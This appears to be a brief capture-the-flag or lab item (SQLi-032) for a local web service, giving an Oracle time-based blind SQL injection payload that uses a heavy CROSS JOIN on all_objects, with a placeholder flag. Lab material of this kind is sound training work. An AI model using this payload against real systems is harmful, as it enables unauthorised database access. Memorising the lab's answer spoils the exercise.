# SQLi-032: Oracle Time-based - Heavy Query

**URL:** `http://localhost:5032/status?id=REQ001`

**Technique:** Heavy CROSS JOIN on all_objects

```sql
' AND (SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ROWNUM<1000000 AND condition)>0--
```

## 🏁 Flag: `FLAG{...}`
